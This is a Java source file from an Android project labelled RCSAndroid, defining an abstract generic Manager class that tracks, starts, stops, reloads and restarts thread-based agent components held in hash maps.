/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Manager.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI;

import java.util.HashMap;
import java.util.Iterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.agent.AgentBase;
import com.ht.RCSAndroidGUI.agent.AgentConf;

// TODO: Auto-generated Javadoc
/**
 * The Class Manager.
 *
 * @param <T> the generic type
 */
public abstract class Manager<T extends ThreadBase> {
	/** The running. */
	protected  HashMap<Integer, T> running;
	
	/** The threads. */
	protected  HashMap<T, Thread> threads;
	
	/** The status. */
	protected Status status;
	
	/**
	 * Instantiates a new manager.
	 */
	public Manager(){
		status = Status.self();
		running = new HashMap<Integer, T>();
		threads = new HashMap<T, Thread>();
	}
	
	/**
	 * Start all.
	 *
	 * @return true, if successful
	 */
	public abstract boolean startAll();
	
	/**
	 * Stop all.
	 */
	public abstract void stopAll() ;
	
	/**
	 * Start.
	 *
	 * @param key the key
	 */
	public abstract  void start( int key) ;
	
	/**
	 * Stop.
	 *
	 * @param key the key
	 */
	public abstract  void stop( int key) ;
	
	/**
	 * Reload .
	 * 
	 * @param key
	 *            the key
	 */
	public void reload(final int key) {
		final T a = running.get(key);
		a.next();
	}
	
	/**
	 * Restart .
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void restart(final int key) {
		final T a = running.get(key);
		stop(key);
		start(key);
	}
	
	/**
	 * Gets the running.
	 *
	 * @return the running
	 */
	public HashMap<Integer, T> getRunning() {
		return running;
	}
}
